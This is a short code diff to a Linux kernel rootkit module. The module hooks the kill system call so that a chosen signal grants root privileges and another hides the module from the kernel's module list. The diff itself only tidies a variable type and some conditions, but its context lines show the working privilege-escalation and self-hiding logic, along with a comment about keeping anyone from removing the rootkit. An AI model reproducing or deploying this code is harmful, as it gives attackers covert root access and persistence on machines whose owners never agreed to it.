@@ -22,7 +22,7 @@ enum signals{
 };
 
 unsigned long *__sys_call_table = NULL;
-static int hidden = 0;
+static short hidden = 0;
 static struct list_head *prev_module;
 #define PREFIX "SOHAIL"
 
@@ -76,12 +76,12 @@ static asmlinkage long hook_kill(const struct pt_regs *regs){
         printk(KERN_INFO "signal: %d == SIGSUPER %d | giving root privilges", sig, SIGSUPER);
         set_root();
         return 0;
-    }else if(sig == SIGINVIS && (hidden) == 0){
+    }else if((sig == SIGINVIS) && (hidden == 0)){
         printk(KERN_INFO "signal: %d == SIGINVIS %d | hiding the rootkit", sig, SIGINVIS);
         hide_me();
         hidden = 1;
         return 0;
-    }else if(sig == SIGINVIS && (hidden) == 1){
+    }else if((sig == SIGINVIS) && (hidden == 1)){
         /* This is only for testing we don't want anyone to get rid of our rootkit */
         printk(KERN_INFO "signal: %d == SIGINVIS %d | reavling the rootkit", sig, SIGINVIS);
         show_me();
@@ -247,12 +247,12 @@ static asmlinkage long hook_kill(pid_t pid, int sig){
         printk(KERN_INFO "signal: %d == SIGSUPER %d | giving root priveliges", sig, SIGSUPER);
         set_root();
         return 0;
-    }else if(sig == SIGINVIS && (hidden) == 0){
+    }else if((sig == SIGINVIS) && (hidden == 0)){
         printk(KERN_INFO "signal: %d == SIGINVIS %d | hiding the rootkit", sig, SIGINVIS);
         hide_me();
         hidden = 1;
         return 0;
-    }else if(sig == SIGINVIS && (hidden) == 1){
+    }else if((sig == SIGINVIS) && (hidden == 1)){
         /* This is only for testing we don't want anyone to get rid of our rootkit */
         printk(KERN_INFO "signal: %d == SIGINVIS %d | reavling the rootkit", sig, SIGINVIS);
         show_me();
